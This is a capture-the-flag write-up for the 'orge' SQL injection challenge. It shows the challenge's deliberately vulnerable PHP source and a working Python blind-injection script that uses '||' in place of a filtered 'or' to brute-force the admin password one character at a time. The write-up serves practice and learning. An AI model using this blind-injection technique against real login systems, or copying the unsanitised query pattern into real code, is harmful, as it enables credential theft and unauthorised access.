# orge

--------

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>
```

Here we have to again use blind injection to get the password and give that as the value of pw. But here we can't use `or` or `and`. We have to use `||` instead of `or` and `&&` instead of `and`.

So I made a script for that :

```python
import requests
import string

session = requests.Session()

url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=' || pw like '{}%"
cookies = {"PHPSESSID": "t2olebiumhrkeldqqkd0g2c5q0"}
pw = ""
for j in range(10):
    for i in string.printable:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('Hello admin' in r.text[:200] and i not in "#%&"):
            pw += i
            print("Password :", pw)
            break

print("Password :", pw)
```

This gives the password as `7b751aec` and giving that as the value of pw solves the challenge
